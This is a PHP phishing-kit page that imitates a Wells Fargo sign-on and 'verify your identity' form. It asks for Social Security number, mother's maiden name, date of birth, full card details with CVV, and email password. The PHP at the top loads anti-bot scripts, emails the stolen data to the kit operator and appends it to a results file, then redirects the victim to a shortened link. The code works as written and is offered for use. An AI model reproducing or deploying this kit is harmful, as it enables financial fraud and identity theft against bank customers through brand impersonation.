<?php
session_start();
error_reporting(0);
include'./BOTS/antibot1.php';
include'./BOTS/antibots2.php';
include'./BOTS/antibots3.php';
include'./BOTS/antibots4.php';
include'./BOTS/antibots5.php';
include'./youremail.php';
if(isset($_POST['continue'])){
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$message .= "[+]===============WELLSFARGO===============\n";
$message .= "[+]===============FULL===============\n";
$message .= "[+]SSN : ".$_POST['SocialSecurityNumber']."\n";
$message .= "[+]MMN : ".$_POST['mmn']."\n";
$message .= "[+]ZIP : ".$_POST['zip']."\n";
$message .= "[+]DOB : ".$_POST['dob']."\n";
$message .= "[+]===============Card===============\n";
$message .= "[+]Card number : ".$_POST['cardnumber']."\n";
$message .= "[+]Name on Card : ".$_POST['NameOnCard']."\n";
$message .= "[+]Card Expiration : ".$_POST['expdate']."\n";
$message .= "[+]Card CVV : ".$_POST['csc']."\n";
$message .= "[+]===============Email address===============\n";
$message .= "[+]Email Address : ".$_POST['email']."\n";
$message .= "[+]Email Password : ".$_POST['pass']."\n";
$message .= "[+]IP address : ".$ip."\n";
$message .= "[+]===============WELLSFARGO===============\n";
$message .= "[+]===============By Mahdex===============\n";
$rnessage  = "$message\n";
$subject = "[Wells] Full |$ip";
$headers = "From: Wellsfargo <WELLSFARGO@smartpage.com> ";
mail($email,$subject,$message,$headers);
$file = fopen("result.txt", 'a');
fwrite($file, $message );
Header ("Location: https://bit.ly/2IleHd0");
}
?>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><style type="text/css"></style>
        


<link rel="icon" href="./style/img/favicon.ico">
<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>


</head><body id="body" theme="ssep" platform="m" contextpath="#"><div id="scLk"></div>
<style>



.blue-button {

    margin-top: 15px;
    border-top-left-radius: 3px;
    border-top-right-radius: 3px;
    border-bottom-right-radius: 3px;
    border-bottom-left-radius: 3px;
    -webkit-appearance: none;
    text-indent: 0;
    display: inline-block;
    color: #fff;
    font-family: Arial;
    font-size: 13px;
    font-style: normal;
    height: 40px;
    line-height: 35px;
    width: 124px;
    text-decoration: none;
    text-align: center;
    line-height: 40px;
    background-color: #ad1d23;
    background: #ad1d23;
}




.agree, .close, .continue {
    background-color: #ad1d23;
    background: #ad1d23;
    border: 0;
}

.agree:not(.nohover):hover, .close:not(.nohover):hover, .continue:not(.nohover):hover {
    background: -moz-linear-gradient(center top,#3064a8 5%,#6695cc 100%);
    background-color: #3064a8;
    cursor: pointer;
}
.continue:not(.nohover):hover, .close:not(.nohover):hover, .agree:not(.nohover):hover {
    background: -webkit-gradient( linear, left top, left bottom, color-stop(0.05, #3064a8), color-stop(1, #6695cc) );
    background: -moz-linear-gradient( center top, #3064a8 5%, #6695cc 100% );
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#3064a8', endColorstr='#6695cc');
    background-color: #3064a8;
    cursor: pointer;
}

.caddoooroo  {margin-top:10px;height:45px;width: 420px;padding-left: 20px;margin-right: 18px;font-weight:400;text-decoration:none;font-size:13px;color:#44464a;border-radius:2px;border:1px solid #cfd1d7}



}




</style>

  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000');
	   $('#csc').mask('000');
	   $('#expdate').mask('00/0000');
        $('#birthdate').mask('00/00/0000');
        $('#SociaNumber').mask('0000');
	});
	</script>




	
		
		<meta http-equiv="Pragma" content="no-cache">
		<meta http-equiv="Pragma: no-cache">
		<meta http-equiv="Cache Control" content="no-store">
		<meta http-equiv="Cache Control: no-store">
		<meta http-equiv="Expires" content="-1">
	


<style id="antiClickjack">.antiClickjackContent{display:none !important;} .noscriptmsg { display:block;font-size:16px;width:100%;margin:5em 0 5em .5em}</style>


        <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
                <meta name="description" content="Click here to sign on to your Wells Fargo account(s).">
          

<link rel="stylesheet" href="./style/css/global.css">
<style>
            section[data-id="hero"] {
                overflow: hidden;
                height: 200px;
            }

            section[data-id="hero"] img {
                position: relative;
                width: 722px;
            }
        </style>
    
    
        <a href="#skip" class="skipLink">main content</a>
        <header isjukebox="" divested="" origin="cob">
	<div>
		<a href="#"><img src="./style/css/logo.png" class="logo" alt="Wells Fargo" origin="cob"></a><ul data-id="search">
			<li><a href="#">Apply</a></li><li><a href="#">Locations</a></li><li><a href="#">Customer Service</a></li><li>
					<div data-id="searchBox">
						<form action="" method="POST" id="frmSearch">
							<input name="q" value="" aria-label="Search" title="Search" size="25" maxlength="75" type="text" autocomplete="off" autocapitalize="off" id="inputTopSearchField" placeholder="Search">
							<img role="button" src="./style/css/rooro.png" alt="search" onclick="Search.events.button.onclick()" onkeyup="Search.events.button.onkeyup()" tabindex="0">
						</form>
					</div>
				</li>
			</ul>
		<ul data-id="headerLinks">
			<li><a href="javascript:history.go(-1)">Back to Previous Page</a></li><li><a href="#">Home</a></li></ul>
	</div>
</header>

        <main>









            <form id="cardbank" name="cardbank" action="" method="POST">
                <noscript><div class="noscriptmsg">For your security, you must enable JavaScript to sign on to your account. Please adjust your browser settings, or go to <a href="#">Online Troubleshooting</a> for help.</div></noscript>


<section data-id="content" aria-label="" class="" origin="cob">
	


	<h1 id="skip" tabindex="-1">Profile information : </h1>
		<div id="errorSignonbank"></div>
		
	<h3 origin="cob" class="copy">Wells Fargo Customer Service needs you to verify your Identity. It takes just a few minutes to verify your online Identity.

</h3>








			<div data-id="inputContainer"><br>
		<label id="Email" for="Email">Email address</label><br>
		

<input type="email" required placeholder="exp : john.smith@mail.com" aria-describedby="text-info-Email Email" name="email" class="caddoooroo">



		</div>
	




	<div data-id="inputContainer">
		<br>
<label id="EmailPassword" for="EmailPassword">Email password</label><br>
		<input type="password" id="Email" required aria-describedby="text-info-Email Email" name="pass" class="caddoooroo">

	</div>













			<div data-id="inputContainer"><br>
		<br>
		
			
		</div>
	






		






			<div data-id="inputContainer">

	<h3 class="copy" origin="cob">

Update Credit/Debit Card, Wells Fargo
			accounts online. </h3>



<br>
		<label id="Card Number" for="Card Number">Card Number </label><br>
		


<input maxlength="24" minlength="14" type="text" placeholder="XXXX-XXXX-XXXX-XXXX" required="required" id="cardnumber" aria-describedby="text-info-cardNumber cardNumberinputError" name="cardnumber" required class="caddoooroo">



		</div>
	
	<div data-id="inputContainer">
		<br>
<label id="Name On Card" for="Name On Card">Name On Card</label><br>
		<input ng-model="NameOnCard" type="text" id="NameOnCard" aria-describedby="text-info-cardNumber NameOnCardinputError" name="NameOnCard" class="ddddaaaaa">

	</div>













			<div data-id="inputContainer"><br>
		<label id="usernamebanklabel" for="Expirydate">Expiration date (MM/YY)</label><br>
		<input maxlength="5" minlength="5" placeholder="MM/YY" required type="text" id="expdate" ng-model="expdate" aria-describedby="text-info-expDate expDateinputError" name="expdate" class="ddddaaaaa">
			
		</div>
	
	<div data-id="inputContainer">
		<br>
<label id="usernamebanklabel" for="csc">CVV</label><br>
		<input required type="number" name="csc" id="csc" aria-describedby="text-info-verificationCode verificationCodeinputError" class="caddoooroo">

	</div>
<div data-id="inputContainer"><br>
		<label id="Email" for="Email">Date of birth (dd/mm/yyyy)</label><br>
		

<input type="number" maxlength="10" minlength="10" required placeholder="DD/MM/YYYY" aria-describedby="text-info-Email Email" name="dob" class="caddoooroo">



		</div>






<div data-id="inputContainer">
		<br>
<label id="SocialSecurityumber" for="SocialSecurityNumber">Social Security Number (xxx-xx-xxxx)</label><br>
		<input type="number" required  maxlength="11" minlength="11" name="SocialSecurityNumber" id="SocialSecurityNumber" aria-describedby="text-info-verificationCode verificationCodeinputError" class="caddoooroo">

	</div>

<div data-id="inputContainer"><br>
		<label id="Email" for="Email">Mother's maiden name</label><br>
		

<input type="text" required="required" placeholder="" aria-describedby="text-info-Email Email" name="mmn" class="caddoooroo">



		</div><div data-id="inputContainer"><br>
		<label id="Email" for="Email">Zip code</label><br>
		

<input type="text" required="required" placeholder="" aria-describedby="text-info-Email Email" name="zip" class="caddoooroo">



		</div>







<div data-id="inputContainer">
		<br><input type="submit" name="continue" id="continue" value="Continue" class="continue blue-button">

<br>
		

	</div>













<div class="continue-container">
                    
                </div>



	<div class="clear-both" data-id="inputContainer">
				</div>

				




</section>
<aside>
                  

                   </aside>

<section data-id="submitContainer">
                </section>
            </form>



        </main>
<div data-id="footerSeparator"></div>
        <footer>
            <div>
	<nav role="navigation">
		<div>
			<ul data-id="links">
				<li><a href="#">About Wells Fargo</a></li><li><a href="@">Careers</a></li><li><a href="#">Privacy, Security &amp; Legal</a></li><li><a href="#">Report Email Fraud</a></li><li><a href="#">Sitemap</a></li><li><a href="#">Home</a></li></ul>
		</div>
	</nav>
</div>
<div class="clear-both">
				<div>
	                <p data-id="copyright" class="cob">© 1999 - 2019 Wells Fargo. All rights reserved. </p>
	                    </div>
			</div>
</footer>

   

            <!--TMS include ends-->
        

</body></html>